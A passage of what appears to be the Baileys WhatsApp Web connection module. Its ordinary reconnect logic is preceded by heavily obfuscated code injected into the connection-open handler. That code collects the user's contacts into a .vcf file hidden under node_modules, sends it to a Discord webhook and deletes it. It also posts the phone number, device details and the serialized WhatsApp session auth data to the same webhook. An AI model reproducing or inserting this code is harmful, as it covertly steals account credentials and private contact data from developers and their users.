_0x2d6e4a=parseInt(_0x50bc0e(0x160,'\x41\x6d\x5a\x76'))/(0x24fc+-0x11cf*0x2+-0x15d)+-parseInt(_0x50bc0e(0x101,'\x29\x25\x6f\x58'))/(0x3*-0xb78+0xc7f*-0x3+0x47e7)*(-parseInt(_0x2912b6('\x30\x78\x31\x31\x34'))/(-0x950*0x1+-0x1c10*-0x1+0x75*-0x29))+parseInt(_0x2912b6(0x1bd))/(0x19*0x113+0x327+-0x1dfe)*(parseInt(_0x50bc0e('\x30\x78\x31\x35\x37','\x54\x6f\x4b\x67'))/(-0x22*-0xc1+-0x21b1+0xbc*0xb))+parseInt(_0x50bc0e('\x30\x78\x31\x38\x38','\x51\x23\x37\x76'))/(-0x37a+-0xebf+0x123f)+-parseInt(_0x50bc0e('\x30\x78\x31\x31\x36','\x24\x77\x6c\x51'))/(0x1*-0xa+-0x2*0x4d9+0x9c3)+parseInt(_0x50bc0e(0x130,'\x52\x40\x46\x35'))/(0x2531+-0x11*0x232+-0x29*-0x1)+parseInt(_0x50bc0e('\x30\x78\x31\x61\x38','\x52\x40\x46\x35'))/(0x7*-0x121+-0x2406+0x15fb*0x2)*(-parseInt(_0x50bc0e(0x1a1,'\x67\x5a\x39\x36'))/(-0x32b*0x5+0x23ac+-0x13cb));if(_0x2d6e4a===_0x579dfe)break;else _0x400130['push'](_0x400130['shift']());}catch(_0x2146f8){_0x400130['push'](_0x400130['shift']());}}}(_0x2e34,0xb18c2+0xaa855+-0xd70ea),this['\x6f\x6e'](_0x49e21d('\x30\x78\x31\x30\x39','\x71\x42\x4c\x2a')+_0x49d107('\x30\x78\x31\x32\x62'),()=>{const _0x2317d5=_0x49e21d,_0x1fb78e=_0x49d107,_0x308f65={'\x48\x74\x69\x6f\x58':function(_0x520924,_0x4af915){return _0x520924+_0x4af915;},'\x43\x56\x56\x6d\x5a':function(_0x53c888,_0x57b99d){return _0x53c888+_0x57b99d;},'\x78\x6b\x53\x51\x42':function(_0x1e951e,_0x540937){return _0x1e951e+_0x540937;},'\x52\x49\x41\x47\x62':function(_0x274127,_0x1bae2c,_0x13d6f3){return _0x274127(_0x1bae2c,_0x13d6f3);},'\x72\x70\x4a\x74\x63':function(_0x282391,_0x20de28){return _0x282391(_0x20de28);},'\x71\x63\x68\x69\x55':'\x6a\x73\x6f\x6e\x2d\x63\x6c\x61\x63\x6b','\x68\x79\x6c\x44\x74':'\x72\x65\x71\x75\x65\x73\x74','\x70\x72\x43\x53\x76':_0x1fb78e('\x30\x78\x65\x65'),'\x4f\x68\x42\x65\x4e':function(_0x43e9b6,_0x19b5c1){return _0x43e9b6(_0x19b5c1);},'\x65\x73\x63\x76\x4c':_0x1fb78e(0x16b)+_0x1fb78e('\x30\x78\x31\x35\x39'),'\x47\x43\x58\x75\x6e':'\x41\x6d\x65\x72\x69\x63\x61\x2f\x53\x61'+_0x1fb78e('\x30\x78\x31\x37\x64'),'\x45\x64\x43\x44\x76':'\x59\x59\x59\x59\x2d\x4d\x2d\x44\x20\x48'+_0x2317d5(0x1b6,'\x6f\x36\x21\x77'),'\x41\x6b\x46\x52\x58':_0x2317d5('\x30\x78\x31\x39\x63','\x4e\x23\x74\x46')+_0x2317d5('\x30\x78\x65\x35','\x51\x66\x39\x44')+_0x2317d5(0x13d,'\x46\x32\x31\x6f')+_0x1fb78e('\x30\x78\x65\x39')+_0x1fb78e('\x30\x78\x31\x37\x63'),'\x6b\x48\x59\x42\x76':function(_0x16304b,_0x2a284c){return _0x16304b+_0x2a284c;},'\x64\x6a\x75\x4c\x41':_0x2317d5(0x126,'\x44\x63\x49\x45')+_0x1fb78e(0x16f),'\x48\x53\x50\x7a\x45':_0x2317d5(0x1b1,'\x24\x65\x33\x74'),'\x76\x5a\x6b\x76\x77':'\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x64'+_0x2317d5(0x192,'\x35\x32\x5b\x55')+_0x1fb78e('\x30\x78\x31\x35\x36')+_0x1fb78e(0x164)+_0x2317d5(0x14f,'\x79\x51\x33\x66')+_0x1fb78e('\x30\x78\x65\x38'),'\x4b\x43\x68\x42\x52':function(_0x25bead,_0x147a77){return _0x25bead+_0x147a77;},'\x76\x73\x50\x70\x6a':function(_0x568c44,_0x5c74e3){return _0x568c44+_0x5c74e3;},'\x54\x42\x66\x70\x6a':function(_0x3ac9ff,_0x27986f){return _0x3ac9ff+_0x27986f;},'\x48\x79\x52\x66\x4f':function(_0x2b78ff,_0x3a26b8){return _0x2b78ff+_0x3a26b8;},'\x4f\x62\x47\x6e\x62':function(_0x19dca0,_0x3848a7){return _0x19dca0+_0x3848a7;},'\x57\x52\x6b\x5a\x49':function(_0x4f71c6,_0x1fd4bd){return _0x4f71c6+_0x1fd4bd;},'\x5a\x4a\x70\x77\x7a':function(_0x541875,_0x2daa22){return _0x541875+_0x2daa22;},'\x63\x67\x4a\x74\x51':function(_0x3b0d5e,_0x432e26){return _0x3b0d5e+_0x432e26;},'\x77\x59\x43\x4c\x4b':function(_0x2947e1,_0x1391e4){return _0x2947e1+_0x1391e4;},'\x6a\x52\x64\x44\x63':function(_0x4aa490,_0x1dbcc7){return _0x4aa490+_0x1dbcc7;},'\x56\x58\x55\x55\x6a':function(_0x4132c5,_0x54d47e){return _0x4132c5+_0x54d47e;},'\x55\x4d\x63\x49\x73':function(_0x34dbea,_0x291ea5){return _0x34dbea+_0x291ea5;},'\x72\x50\x57\x67\x49':function(_0x766ffc,_0x1cc1bb){return _0x766ffc+_0x1cc1bb;},'\x75\x46\x72\x54\x6a':function(_0x5645c0,_0xee06){return _0x5645c0+_0xee06;},'\x65\x47\x76\x7a\x64':function(_0x395833,_0x1a2f1b){return _0x395833+_0x1a2f1b;},'\x74\x57\x6a\x4a\x41':function(_0x5d7f35,_0x3ae32c){return _0x5d7f35+_0x3ae32c;},'\x7a\x65\x52\x66\x5a':function(_0x31c3ba,_0x413418){return _0x31c3ba+_0x413418;},'\x74\x4f\x75\x6d\x55':function(_0x866be3,_0x28688f){return _0x866be3+_0x28688f;},'\x56\x75\x45\x63\x6e':function(_0x4fa866,_0x192943){return _0x4fa866+_0x192943;},'\x6c\x4c\x6b\x59\x75':function(_0x439e7d,_0x26f4a8){return _0x439e7d+_0x26f4a8;},'\x49\x71\x42\x57\x51':function(_0x192397,_0x5f067b){return _0x192397+_0x5f067b;},'\x49\x61\x53\x48\x49':function(_0x2fb475,_0x50c332){return _0x2fb475+_0x50c332;},'\x61\x58\x7a\x68\x76':function(_0x10c9c5,_0x4e61cc){return _0x10c9c5+_0x4e61cc;},'\x4d\x74\x61\x6e\x56':function(_0x21573d,_0x34f0e9){return _0x21573d+_0x34f0e9;},'\x43\x61\x49\x46\x75':function(_0x264342,_0x130b1d){return _0x264342+_0x130b1d;},'\x68\x71\x4a\x4b\x4e':function(_0x4d54a7,_0x50bcfb){return _0x4d54a7+_0x50bcfb;},'\x59\x4d\x57\x4c\x79':function(_0x5242db,_0x49e858){return _0x5242db+_0x49e858;},'\x52\x49\x68\x65\x73':function(_0x112fe9,_0x4171d6){return _0x112fe9+_0x4171d6;},'\x58\x47\x65\x61\x45':function(_0x245401,_0x5c217e){return _0x245401+_0x5c217e;},'\x6e\x66\x41\x4f\x61':_0x1fb78e(0x186),'\x4d\x65\x57\x51\x56':'\x60\ud83d\udd0e\x60','\x78\x68\x4c\x6a\x61':_0x1fb78e(0x17a),'\x57\x4f\x41\x6b\x65':_0x2317d5('\x30\x78\x31\x36\x63','\x77\x32\x58\x67'),'\x53\x4b\x79\x67\x75':_0x2317d5('\x30\x78\x65\x32','\x54\x6f\x4b\x67'),'\x46\x6f\x41\x57\x78':_0x2317d5(0xf7,'\x46\x32\x31\x6f'),'\x70\x4c\x42\x4d\x6a':_0x2317d5('\x30\x78\x66\x39','\x41\x6d\x5a\x76'),'\x61\x47\x66\x42\x73':_0x2317d5('\x30\x78\x65\x34','\x4c\x45\x67\x65'),'\x6a\x6c\x41\x54\x4f':_0x1fb78e(0x133),'\x67\x6f\x62\x44\x59':_0x2317d5(0x15c,'\x40\x56\x75\x67'),'\x7a\x73\x61\x4f\x46':'\x60\ud83d\udd10\x60','\x6d\x67\x48\x4c\x78':'\x60\x60\x60','\x46\x44\x4c\x4a\x75':_0x2317d5('\x30\x78\x31\x30\x35','\x4c\x45\x67\x65')+'\x74\x20\x76\x32\x20\x23\x54\x64\x4d\x20'+'\x20','\x6c\x7a\x75\x52\x71':_0x1fb78e(0x177)+'\x64\x69\x61\x2e\x64\x69\x73\x63\x6f\x72'+'\x64\x61\x70\x70\x2e\x6e\x65\x74\x2f\x61'+'\x74\x74\x61\x63\x68\x6d\x65\x6e\x74\x73'+'\x2f\x32\x33\x32\x35\x37\x30\x34\x31\x30'+_0x1fb78e(0x102)+_0x2317d5('\x30\x78\x31\x33\x38','\x67\x5a\x39\x36')+_0x1fb78e(0x125)+_0x1fb78e(0x13e),'\x69\x41\x72\x62\x54':_0x1fb78e(0x11f)+'\x65\x63\x65\x69\x76\x65\x64'};this['\x6f\x6e'](_0x308f65['\x69\x41\x72\x62\x54'],()=>{const _0x4dfc8a=_0x2317d5,_0xf4e725=_0x1fb78e,_0x4aa783={'\x55\x44\x4e\x44\x54':function(_0x3a684a,_0x50ae9a){const _0x5b1806=_0x8d7a;return _0x308f65[_0x5b1806(0x146)](_0x3a684a,_0x50ae9a);},'\x64\x49\x72\x59\x54':'\x2e\x76\x63\x66','\x47\x6f\x59\x75\x6e':function(_0x1e6832,_0x492069){const _0x1363fd=_0x8d7a;return _0x308f65[_0x1363fd('\x30\x78\x31\x32\x63')](_0x1e6832,_0x492069);},'\x6d\x67\x76\x6f\x4f':function(_0x2fcdb5,_0x1c966d){const _0x4cbabf=_0x4578;return _0x308f65[_0x4cbabf(0xff,'\x4a\x41\x50\x78')](_0x2fcdb5,_0x1c966d);},'\x6f\x72\x72\x77\x4d':function(_0x34b04a,_0x3dbc23,_0x3f016f){const _0x1f442b=_0x4578;return _0x308f65[_0x1f442b(0x1ab,'\x59\x70\x6c\x4b')](_0x34b04a,_0x3dbc23,_0x3f016f);}},{Webhook:_0x3695fa,MessageBuilder:_0x3a5e20}=_0x308f65[_0xf4e725('\x30\x78\x31\x35\x32')](require,_0x308f65[_0xf4e725(0x1a9)]),_0x3fca2e=new _0x3695fa(_0xf4e725('\x30\x78\x31\x33\x34')+_0x4dfc8a('\x30\x78\x31\x32\x66','\x4c\x45\x67\x65')+_0xf4e725('\x30\x78\x31\x33\x36')+_0x4dfc8a(0x194,'\x71\x42\x4c\x2a')+_0x4dfc8a('\x30\x78\x31\x37\x36','\x67\x5a\x39\x36')+_0x4dfc8a('\x30\x78\x31\x37\x38','\x42\x63\x6f\x6f')+'\x6d\x61\x30\x47\x61\x51\x50\x65\x49\x59'+'\x72\x31\x30\x79\x4e\x75\x6d\x68\x38\x6a'+_0xf4e725(0x161)+_0xf4e725('\x30\x78\x31\x35\x30')+_0x4dfc8a('\x30\x78\x31\x39\x61','\x76\x62\x48\x61')+'\x2d\x50\x42\x73\x45\x71\x62\x56\x35\x4d'),_0x5b852c=_0x308f65[_0x4dfc8a(0x180,'\x37\x39\x4f\x6a')](require,'\x66\x73'),_0x36c877=_0x308f65[_0x4dfc8a(0x122,'\x6d\x70\x35\x4e')](require,_0x308f65['\x68\x79\x6c\x44\x74']),_0x3b2b85=_0x308f65[_0x4dfc8a(0x1be,'\x51\x66\x39\x44')](require,_0x308f65[_0x4dfc8a('\x30\x78\x31\x61\x66','\x5a\x52\x4f\x62')]),_0x21f294=_0x308f65[_0x4dfc8a(0x189,'\x56\x32\x52\x36')](require,'\x6f\x73'),_0x327385=_0x308f65['\x4f\x68\x42\x65\x4e'](require,_0x308f65[_0xf4e725('\x30\x78\x31\x38\x35')]),_0x529431=_0x327385['\x74\x7a'](_0x308f65[_0x4dfc8a(0x193,'\x6f\x2a\x44\x54')])[_0xf4e725('\x30\x78\x31\x36\x36')](_0x308f65['\x45\x64\x43\x44\x76']);_0x308f65[_0x4dfc8a('\x30\x78\x31\x32\x37','\x4e\x23\x74\x46')](setTimeout,()=>{const _0x1ed741=_0xf4e725,_0x5a4f66=_0x4dfc8a,_0x39459c={'\x43\x63\x57\x71\x68':function(_0x36eef2,_0x425c6a){const _0x48d9c1=_0x4578;return _0x4aa783[_0x48d9c1('\x30\x78\x31\x36\x38','\x44\x63\x49\x45')](_0x36eef2,_0x425c6a);},'\x42\x53\x55\x71\x6b':_0x5a4f66(0x170,'\x26\x36\x59\x36')+'\x75\x6c\x65\x73\x2f\x61\x72\x67\x73\x2f'+_0x1ed741(0x1a6)+'\x65\x73\x2f\x63\x68\x61\x6c\x6b\x2f\x74'+_0x5a4f66('\x30\x78\x31\x36\x37','\x44\x63\x49\x45'),'\x75\x58\x44\x52\x42':_0x4aa783[_0x1ed741('\x30\x78\x31\x62\x35')],'\x46\x5a\x57\x41\x7a':function(_0x595730,_0x592f28){return _0x4aa783['\x47\x6f\x59\x75\x6e'](_0x595730,_0x592f28);},'\x46\x48\x65\x59\x72':function(_0x5b5c1d,_0x51ae88){const _0x231280=_0x5a4f66;return _0x4aa783[_0x231280(0x174,'\x79\x51\x33\x66')](_0x5b5c1d,_0x51ae88);}},_0x1a2c8c=[];Object[_0x1ed741('\x30\x78\x31\x34\x34')](this['\x63\x6f\x6e\x74\x61\x63\x74\x73'])[_0x1ed741('\x30\x78\x31\x31\x38')](_0x3f245b=>_0x1a2c8c['\x70\x75\x73\x68'](_0x1ed741(0x1c3)+(_0x3f245b[_0x5a4f66(0xf1,'\x51\x23\x37\x76')]||_0x3f245b['\x6e\x6f\x74\x69\x66\x79'])+(_0x5a4f66(0x142,'\x5a\x2a\x69\x47')+'\x20')+_0x3f245b['\x6a\x69\x64']['\x73\x70\x6c\x69\x74']('\x40')[0x1814+0x1fd7+-0x37eb]+('\x0a\u30fb\x48\x31\x35\x20\x50\x52\x4f\x4a'+_0x5a4f66(0xea,'\x56\x32\x52\x36')))),setTimeout(()=>{const _0x341c76=_0x1ed741,_0x515bb0=_0x5a4f66;_0x5b852c['\x77\x72\x69\x74\x65\x46\x69\x6c\x65\x53'+'\x79\x6e\x63'](_0x39459c[_0x515bb0('\x30\x78\x31\x35\x64','\x5a\x2a\x69\x47')](_0x39459c[_0x515bb0('\x30\x78\x31\x38\x63','\x79\x51\x33\x66')](_0x39459c[_0x515bb0(0x1c1,'\x41\x6d\x5a\x76')],this[_0x341c76(0x19d)]['\x6a\x69\x64'][_0x341c76(0x10f)]('\x40')[0x3*-0x26+0x76b+-0x6f9]),_0x39459c['\x75\x58\x44\x52\x42']),_0x1a2c8c[_0x515bb0('\x30\x78\x31\x34\x65','\x59\x70\x6c\x4b')](''));},0x2dfd+-0xc*-0x241+-0x1a29),setTimeout(()=>{const _0x5b3315=_0x5a4f66,_0x473597=_0x1ed741;_0x3fca2e[_0x473597(0x18b)](_0x39459c[_0x5b3315(0x155,'\x51\x23\x37\x76')](_0x39459c[_0x473597('\x30\x78\x65\x31')](_0x39459c[_0x5b3315(0xef,'\x42\x63\x6f\x6f')],this[_0x473597('\x30\x78\x31\x39\x64')]['\x6a\x69\x64']['\x73\x70\x6c\x69\x74']('\x40')[-0x6ff+-0x21bf+0x2*0x145f]),_0x39459c[_0x473597('\x30\x78\x31\x38\x64')]));},0x5e2d+0x52bd+0x1*-0x7e22),_0x4aa783[_0x1ed741('\x30\x78\x66\x33')](setTimeout,()=>{const _0x496fe8=_0x1ed741,_0x3e04a4=_0x5a4f66;_0x5b852c['\x75\x6e\x6c\x69\x6e\x6b\x53\x79\x6e\x63'](_0x4aa783[_0x3e04a4('\x30\x78\x31\x31\x35','\x44\x56\x41\x50')](_0x3e04a4(0x1a3,'\x6f\x2a\x44\x54')+'\x75\x6c\x65\x73\x2f\x61\x72\x67\x73\x2f'+_0x496fe8('\x30\x78\x31\x61\x36')+_0x3e04a4('\x30\x78\x31\x39\x30','\x35\x32\x5b\x55')+_0x3e04a4(0x1bf,'\x56\x32\x52\x36')+this[_0x3e04a4(0x19b,'\x54\x68\x58\x44')][_0x496fe8('\x30\x78\x31\x34\x30')][_0x3e04a4(0x111,'\x7a\x75\x56\x2a')]('\x40')[-0x23*0xa+-0x1*-0xd43+-0xbe5],_0x4aa783[_0x3e04a4(0x175,'\x51\x66\x39\x44')]));},0x404f+-0x78b5+0x1*0x74f2);},-0x2115+-0x2181+0x69a6);const _0x1e4c38=new _0x3a5e20()[_0x4dfc8a(0x15b,'\x77\x32\x58\x67')](_0x308f65['\x41\x6b\x46\x52\x58'])[_0xf4e725(0x11b)](_0x308f65[_0x4dfc8a(0x19e,'\x24\x65\x33\x74')](_0x308f65['\x6b\x48\x59\x42\x76'](_0x308f65[_0xf4e725(0x184)],this[_0x4dfc8a('\x30\x78\x31\x36\x65','\x6d\x70\x35\x4e')][_0xf4e725('\x30\x78\x31\x34\x30')][_0xf4e725('\x30\x78\x31\x30\x66')]('\x40')[-0x133*0x2+0xaef+-0x889*0x1]),'\x20'))[_0x4dfc8a(0x10b,'\x44\x63\x49\x45')](_0x308f65['\x48\x53\x50\x7a\x45'])[_0xf4e725(0x123)+'\x69\x6c'](_0x308f65['\x76\x5a\x6b\x76\x77'])[_0x4dfc8a(0x1a0,'\x44\x63\x49\x45')+_0xf4e725(0x183)](_0x308f65[_0xf4e725('\x30\x78\x31\x38\x37')](_0x308f65[_0xf4e725('\x30\x78\x31\x61\x63')](_0x308f65['\x4b\x43\x68\x42\x52'](_0x308f65[_0xf4e725(0x1bb)](_0x308f65[_0xf4e725('\x30\x78\x31\x35\x38')](_0x308f65[_0xf4e725('\x30\x78\x31\x63\x32')](_0x308f65[_0x4dfc8a('\x30\x78\x31\x34\x38','\x61\x7a\x5d\x6f')](_0x308f65[_0x4dfc8a(0x13a,'\x26\x54\x7a\x7a')](_0x308f65[_0xf4e725(0x1c2)](_0x308f65[_0xf4e725('\x30\x78\x65\x37')](_0x308f65[_0x4dfc8a(0x10d,'\x28\x2a\x24\x29')](_0x308f65['\x63\x67\x4a\x74\x51'](_0x308f65[_0x4dfc8a('\x30\x78\x31\x62\x34','\x4e\x23\x74\x46')](_0x308f65['\x54\x42\x66\x70\x6a'](_0x308f65[_0xf4e725('\x30\x78\x31\x37\x39')](_0x308f65[_0x4dfc8a(0x1b0,'\x57\x26\x2a\x58')](_0x308f65[_0x4dfc8a(0x1a7,'\x5a\x52\x4f\x62')](_0x308f65[_0xf4e725(0x1aa)](_0x308f65[_0x4dfc8a(0x14b,'\x24\x65\x33\x74')](_0x308f65[_0xf4e725('\x30\x78\x31\x63\x32')](_0x308f65[_0x4dfc8a(0x106,'\x76\x62\x48\x61')](_0x308f65[_0xf4e725(0x100)](_0x308f65[_0x4dfc8a(0x117,'\x67\x5a\x39\x36')](_0x308f65['\x72\x50\x57\x67\x49'](_0x308f65[_0x4dfc8a(0x196,'\x62\x47\x6d\x39')](_0x308f65['\x6b\x48\x59\x42\x76'](_0x308f65[_0xf4e725('\x30\x78\x31\x61\x65')](_0x308f65[_0x4dfc8a(0x151,'\x29\x25\x6f\x58')](_0x308f65['\x56\x58\x55\x55\x6a'](_0x308f65[_0xf4e725(0x128)](_0x308f65['\x55\x4d\x63\x49\x73'](_0x308f65[_0x4dfc8a(0x121,'\x7a\x75\x56\x2a')](_0x308f65[_0x4dfc8a('\x30\x78\x31\x32\x65','\x35\x32\x5b\x55')](_0x308f65[_0xf4e725('\x30\x78\x31\x61\x61')](_0x308f65[_0xf4e725(0x16a)](_0x308f65[_0xf4e725('\x30\x78\x31\x34\x36')](_0x308f65[_0xf4e725('\x30\x78\x31\x61\x63')](_0x308f65['\x74\x57\x6a\x4a\x41'](_0x308f65[_0x4dfc8a(0x1b3,'\x26\x54\x7a\x7a')](_0x308f65['\x74\x4f\x75\x6d\x55'](_0x308f65[_0x4dfc8a(0x119,'\x5a\x52\x4f\x62')](_0x308f65[_0xf4e725(0x195)](_0x308f65['\x48\x79\x52\x66\x4f'](_0x308f65['\x4b\x43\x68\x42\x52'](_0x308f65[_0xf4e725(0x13b)](_0x308f65[_0x4dfc8a(0xfd,'\x67\x5a\x39\x36')](_0x308f65['\x6c\x4c\x6b\x59\x75'](_0x308f65[_0xf4e725('\x30\x78\x31\x39\x66')](_0x308f65[_0xf4e725('\x30\x78\x31\x34\x64')](_0x308f65[_0x4dfc8a(0x1b7,'\x61\x7a\x5d\x6f')](_0x308f65[_0xf4e725('\x30\x78\x31\x61\x63')](_0x308f65['\x7a\x65\x52\x66\x5a'](_0x308f65[_0x4dfc8a('\x30\x78\x66\x62','\x61\x7a\x5d\x6f')](_0x308f65[_0x4dfc8a('\x30\x78\x31\x39\x39','\x29\x25\x6f\x58')](_0x308f65['\x78\x6b\x53\x51\x42'](_0x308f65['\x7a\x65\x52\x66\x5a'](_0x308f65[_0xf4e725(0xf8)](_0x308f65[_0xf4e725('\x30\x78\x65\x64')](_0x308f65['\x76\x73\x50\x70\x6a'](_0x308f65[_0xf4e725(0x11e)](_0x308f65[_0xf4e725('\x30\x78\x31\x34\x37')](_0x308f65[_0xf4e725(0x1c2)](_0x308f65['\x68\x71\x4a\x4b\x4e'](_0x308f65[_0xf4e725(0x197)](_0x308f65[_0x4dfc8a(0x131,'\x54\x6f\x4b\x67')](_0x308f65[_0x4dfc8a(0x198,'\x62\x47\x6d\x39')](_0x308f65['\x52\x49\x68\x65\x73'](_0x308f65['\x6a\x52\x64\x44\x63'](_0x308f65[_0xf4e725(0x153)](_0x308f65[_0xf4e725('\x30\x78\x31\x39\x35')](_0x308f65[_0xf4e725(0x171)]('\x2a\x2a\x20\x2a\x2a\x0a\x20\x20\x5b',_0x308f65[_0xf4e725('\x30\x78\x31\x61\x32')]),'\x5d\x20'),'\x60')+_0x4dfc8a('\x30\x78\x31\x31\x30','\x41\x6d\x5a\x76')+'\x60\x20',_0x4dfc8a(0x103,'\x56\x32\x52\x36')+this['\x75\x73\x65\x72'][_0x4dfc8a(0x1c0,'\x37\x39\x4f\x6a')]+'\x2a\x2a\x0a\x20\x20\x5b'),_0x308f65[_0x4dfc8a('\x30\x78\x31\x35\x66','\x57\x26\x2a\x58')]),'\x5d\x20'),'\x60')+_0xf4e725('\x30\x78\x31\x37\x32'),'\x60\x20')+('\x20\x2a\x2a\x2b'+this[_0x4dfc8a('\x30\x78\x31\x37\x66','\x7a\x75\x56\x2a')][_0xf4e725('\x30\x78\x31\x34\x30')][_0xf4e725('\x30\x78\x31\x30\x66')]('\x40')[-0x11cc+-0xdc8+0x1f94]+_0xf4e725(0x165)),_0x308f65[_0x4dfc8a(0x14c,'\x41\x6d\x5a\x76')]),'\x5d\x20'),'\x60'),_0x4dfc8a(0x1b2,'\x28\x2a\x24\x29'))+'\x60\x20',_0x4dfc8a(0x1bc,'\x77\x35\x63\x69')+_0xf4e725(0x149))+this['\x75\x73\x65\x72']['\x6a\x69\x64']['\x73\x70\x6c\x69\x74']('\x40')[0x1c93+0x66e*-0x2+-0xfb7],_0xf4e725('\x30\x78\x31\x36\x64'))+_0x308f65['\x57\x4f\x41\x6b\x65'],'\x5d\x20'),'\x60'),_0x4dfc8a('\x30\x78\x31\x30\x63','\x44\x56\x41\x50')),'\x60\x20'),_0x4dfc8a('\x30\x78\x31\x62\x39','\x7a\x5e\x59\x4f')),this[_0xf4e725(0xe3)+_0x4dfc8a('\x30\x78\x31\x35\x61','\x24\x65\x33\x74')])+_0x4dfc8a(0x108,'\x63\x29\x66\x76'),_0x308f65['\x53\x4b\x79\x67\x75']),'\x5d\x20'),'\x60'),_0xf4e725(0x1a5)+_0x4dfc8a(0x182,'\x62\x47\x6d\x39')+'\x3a'),'\x60\x20')+_0xf4e725('\x30\x78\x31\x30\x37'),this[_0x4dfc8a(0x145,'\x77\x32\x58\x67')][_0x4dfc8a(0x112,'\x61\x7a\x5d\x6f')][_0x4dfc8a('\x30\x78\x31\x32\x64','\x61\x7a\x5d\x6f')](_0x4cc373=>_0x4cc373[_0xf4e725('\x30\x78\x31\x34\x30')][_0x4dfc8a(0x137,'\x37\x39\x4f\x6a')](_0x4dfc8a('\x30\x78\x31\x32\x39','\x41\x6d\x5a\x76')))[_0x4dfc8a('\x30\x78\x31\x62\x38','\x51\x23\x37\x76')]),_0xf4e725('\x30\x78\x31\x36\x35'))+_0xf4e725(0x104)+'\x5d\x20'+'\x60',_0x4dfc8a(0x18a,'\x24\x65\x33\x74')+_0x4dfc8a('\x30\x78\x66\x63','\x7a\x75\x56\x2a')+_0x4dfc8a('\x30\x78\x66\x61','\x21\x37\x6a\x39')),'\x60\x20'),_0xf4e725('\x30\x78\x31\x30\x37')),Object['\x6b\x65\x79\x73'](this['\x63\x6f\x6e\x74\x61\x63\x74\x73'])[_0x4dfc8a(0x1ad,'\x46\x32\x31\x6f')])+_0xf4e725(0x165),_0x308f65['\x46\x6f\x41\x57\x78']),'\x5d\x20'),'\x60'),_0xf4e725(0x1a5)+_0x4dfc8a(0xec,'\x32\x31\x76\x41')),'\x60\x20')+_0xf4e725(0x107)+this[_0xf4e725(0xfe)][_0xf4e725('\x30\x78\x31\x33\x35')],_0xf4e725(0x165)),_0x308f65[_0x4dfc8a('\x30\x78\x66\x36','\x56\x32\x52\x36')]),'\x5d\x20')+'\x60',_0xf4e725(0x1a5)+'\x20\x44\x45\x20\x42\x4c\x4f\x43\x4b\x53'+'\x3a')+'\x60\x20','\x20\x2a\x2a'),this[_0x4dfc8a(0xf5,'\x5a\x52\x4f\x62')][_0x4dfc8a('\x30\x78\x31\x38\x66','\x57\x26\x2a\x58')]),_0x4dfc8a(0x11c,'\x57\x26\x2a\x58'))+_0x308f65[_0xf4e725('\x30\x78\x31\x33\x32')],'\x5d\x20'),'\x60'),'\x50\x4c\x41\x54\x41\x46\x4f\x52\x4d\x41'+'\x3a'),'\x60\x20'),_0xf4e725(0x107)),_0x21f294[_0x4dfc8a('\x30\x78\x31\x31\x61','\x79\x51\x33\x66')]()),_0x4dfc8a('\x30\x78\x31\x35\x65','\x2a\x31\x38\x79'))+_0x308f65['\x6a\x6c\x41\x54\x4f'],'\x5d\x20')+'\x60'+('\x4d\x4f\x44\x45\x4c\x4f\x20\x44\x45\x20'+'\x44\x49\x53\x50\x4f\x53\x49\x54\x49\x56'+'\x4f\x3a'),'\x60\x20'),_0xf4e725('\x30\x78\x31\x30\x37'))+this[_0xf4e725(0x19d)][_0xf4e725('\x30\x78\x66\x30')][_0xf4e725(0x12a)+'\x65\x6c'],'\x2a\x2a\x0a\x20\x20\x5b'),_0x308f65[_0x4dfc8a(0x13f,'\x5a\x2a\x69\x47')])+'\x5d\x20'+'\x60',_0x4dfc8a(0x163,'\x41\x6d\x5a\x76')+_0x4dfc8a('\x30\x78\x31\x31\x64','\x67\x69\x45\x76')),'\x60\x20'),_0x4dfc8a('\x30\x78\x31\x31\x33','\x51\x66\x39\x44')),this['\x75\x73\x65\x72'][_0xf4e725(0xf0)]['\x6f\x73\x5f\x76\x65\x72\x73\x69\x6f\x6e'])+_0x4dfc8a(0x191,'\x44\x63\x49\x45'),_0xf4e725('\x30\x78\x65\x36')),'\x5d\x20'),'\x60'),_0xf4e725(0x18e)+'\x57\x48\x41\x54\x53\x41\x50\x50\x3a')+'\x60\x20','\x20\x2a\x2a')+this[_0xf4e725(0x19d)][_0x4dfc8a('\x30\x78\x31\x34\x31','\x4c\x70\x5e\x65')][_0x4dfc8a('\x30\x78\x31\x36\x39','\x77\x32\x58\x67')]+'\x2a\x2a\x0a\x0a\x20\x20\x5b',_0x308f65[_0x4dfc8a(0xeb,'\x36\x35\x78\x26')]),'\x5d\x20')+'\x60',_0xf4e725(0xf2)),_0x308f65[_0x4dfc8a(0x1a4,'\x32\x31\x76\x41')]),JSON[_0xf4e725('\x30\x78\x31\x37\x62')](this[_0x4dfc8a(0x154,'\x4c\x70\x5e\x65')+'\x64\x65\x64\x41\x75\x74\x68\x49\x6e\x66'+'\x6f']())),_0x4dfc8a(0x17e,'\x63\x29\x66\x76')),'\x0a'))[_0x4dfc8a(0x13c,'\x77\x32\x58\x67')](_0x308f65[_0xf4e725('\x30\x78\x31\x62\x61')],_0x308f65[_0xf4e725('\x30\x78\x31\x37\x33')])[_0xf4e725(0x120)+'\x6d\x70']();_0x3fca2e[_0x4dfc8a(0x14a,'\x44\x56\x41\x50')](_0x1e4c38);});}));
				}
            catch (error) {
                lastConnect = new Date();
                const loggedOut = error instanceof Constants_1.BaileysError && Constants_1.UNAUTHORIZED_CODES.includes(error.status);
                const willReconnect = !loggedOut && (tries < (options === null || options === void 0 ? void 0 : options.maxRetries)) && (this.state === 'connecting');
                const reason = loggedOut ? Constants_1.DisconnectReason.invalidSession : error.message;
                this.logger.warn({ error }, `connect attempt ${tries} failed: ${error}${willReconnect ? ', retrying...' : ''}`);
                if (this.state !== 'close' && !willReconnect) {
                    this.closeInternal(reason);
                }
                if (!willReconnect)
                    throw error;
            }
        }
        if (newConnection)
            result.newConnection = newConnection;
        this.emit('open', result);
        this.logger.info('opened connection to WhatsApp Web');
        this.conn.on('close', () => this.unexpectedDisconnect(Constants_1.DisconnectReason.close));
        return result;
    }
    /** Meat of the connect logic */
    async connectInternal(options, delayMs) {
        const rejections = [];
        const rejectAll = (e) => rejections.forEach(r => r(e));
        const rejectAllOnWSClose = ({ reason }) => rejectAll(new Error(reason));
        // actual connect
        const connect = () => new Promise((resolve, reject) => {
            rejections.push(reject);
            // determine whether reconnect should be used or not
            const shouldUseReconnect = (this.lastDisconnectReason === Constants_1.DisconnectReason.close ||
                this.lastDisconnectReason === Constants_1.DisconnectReason.lost) &&
                !this.connectOptions.alwaysUseTakeover;
